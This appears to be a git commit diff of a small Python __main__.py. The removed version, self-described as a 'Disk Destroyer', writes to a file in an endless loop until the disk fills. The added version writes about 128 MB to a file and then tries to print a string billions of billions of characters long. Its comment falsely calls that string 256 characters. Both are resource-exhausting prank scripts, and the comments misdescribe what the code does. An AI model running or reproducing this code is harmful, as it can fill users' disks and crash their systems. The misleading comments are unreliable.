ee8707e17e748a34dc7b6d42e269a1cb8d402b95
Neo <87961887+ItzMeBlaze@users.noreply.github.com>
2024-09-01 18:18:05 +0530

    __main__.py

--- __main__.py
+++ __main__.py
@@ -1,10 +1,12 @@
-str = "This is a Disk Destroyer file "
-with open("DoomSlayer.txt", "a") as file:
- while True:
-  try:
-    file.write(str)
-  except Exception:
-    break
- file.close()
+# Prepare special characters for writing and printing
+str = "!" * 128  # 128 special characters
+filename = "@" * 16 + ".txt"  # 16 special characters in filename
+message = "#" * 246810121416182022242628  # 256 special characters for the print statement
 
-print("It is DoomSlayer")
+# Write to file as fast as possible
+with open(filename, "a") as file:
+    for _ in range(1000000):  # High iteration count for speed
+        file.write(str)
+
+# Print the message immediately after writing
+print(message)
